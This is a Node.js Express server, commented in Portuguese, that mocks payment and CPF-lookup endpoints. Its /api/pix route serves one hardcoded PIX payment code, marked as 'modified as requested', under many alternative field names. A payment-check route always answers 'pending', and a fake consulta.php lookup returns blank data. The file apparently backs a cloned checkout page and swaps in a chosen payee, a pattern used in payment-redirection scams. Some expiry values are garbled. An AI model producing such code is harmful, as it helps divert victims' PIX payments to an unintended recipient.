const express = require('express');
const cors = require('cors');
const path = require('path');
const fs = require('fs');

const app = express();
const PORT = process.env.PORT || 3001;

app.use(cors());
app.use(express.json());

// Middleware de log para depuração
app.use((req, res, next) => {
    console.log(`[${new Date().toISOString()}] ${req.method} ${req.url}`);
    next();
});

// String PIX modificada conforme solicitado
const pixString = "00020101021226940014br.gov.bcb.pix2572qrcode.somossimpay.com.br/v2/qr/cob/af56bc59-1ded-425c-b01f-2598e635c6f25204000053039865802BR5922MARKETPLACE PAGUE LTDA6009SAO PAULO62070503***6304BDF3";

// Rota para servir a imagem do QR Code diretamente
app.get('/api/qr-image', (req, res) => {
    const qrPath = path.join(__dirname, 'qrcode-pix.png');
    if (fs.existsSync(qrPath)) {
        res.sendFile(qrPath);
    } else {
        res.status(404).send('QR Code image not found');
    }
});

// Mock de Verificação de Pagamento
app.all('/api/check-payment', (req, res) => {
    res.json({
        "success": true,
        "status": "pending",
        "bank_tx_id": null
    });
});

app.all('/api/pix', (req, res) => {
    const qrImageUrl = "/api/qr-image?t=" + Date.now();
    res.json({
        "success": true,
        "status": "pending",
        "pix_code": pixString,
        "transaction_id": "TRX1773112005534XIK04E",
        "deposit_id": "TRX1773112005534XIK04E",
        "qrcode": pixString,
        "amount": 49.90,
        "amount_cents": 4990,
        "key": null,
        "brcode": pixString,
        "payload": pixString,
        "pixCode": pixString,
        "qrcode_url": qrImageUrl,
        "qrcode_base64": qrImageUrl,
        "qr_code_image": qrImageUrl,
        "paid": false,
        "pix": {
            "key": null,
            "brcode": pixString,
            "qrcode": pixString,
            "payload": pixString,
            "expiresAt": "1-01-01T00:00:00-03:6.466666666666669"
        },
        "raw": {
            "transactionId": "TRX1773112005534XIK04E",
            "status": "PENDING",
            "paymentMethod": "PIX",
            "amount": 4990,
            "netAmount": 4650,
            "fees": 340,
            "createdAt": "2026-03-10T00:06:45-03:00",
            "invoiceUrl": "",
            "paymentData": {
                "id": "051c8629ab33410192d53112c3aafcd3",
                "qrCode": pixString,
                "qrCodeUrl": qrImageUrl,
                "qrCodeBase64": qrImageUrl,
                "copyPaste": pixString,
                "expiresAt": "1-01-01T00:00:00-03:6.466666666666669"
            }
        },
        "raw_response": {
            "success": true,
            "data": {
                "transactionId": "TRX1773112005534XIK04E",
                "status": "PENDING",
                "paymentMethod": "PIX",
                "amount": 4990,
                "netAmount": 4650,
                "fees": 340,
                "createdAt": "2026-03-10T00:06:45-03:00",
                "invoiceUrl": "",
                "paymentData": {
                    "id": "051c8629ab33410192d53112c3aafcd3",
                    "qrCode": pixString,
                    "qrCodeUrl": qrImageUrl,
                    "qrCodeBase64": qrImageUrl,
                    "copyPaste": pixString,
                    "expiresAt": "1-01-01T00:00:00-03:6.466666666666669"
                }
            }
        }
    });
});

// Mock de Consulta CPF
app.get('/api/consulta.php', (req, res) => {
    res.json({
        "success": true,
        "DADOS": {
            "nome": "",
            "data_nascimento": "",
            "nome_mae": "",
            "sexo": ""
        }
    });
});

// Rota explícita para o arquivo principal
app.get('/', (req, res) => {
    res.sendFile(path.join(__dirname, 'index.html'));
});

// Servir os arquivos estáticos
app.use(express.static(path.join(__dirname)));

// Fallback para SPA
app.use((req, res) => {
    res.sendFile(path.join(__dirname, 'index.html'));
});

if (require.main === module) {
    app.listen(PORT, () => {
        console.log(`Servidor rodando na porta ${PORT}`);
        console.log(`Rota PIX disponível em: http://localhost:${PORT}/api/pix`);
    });
}

module.exports = app;
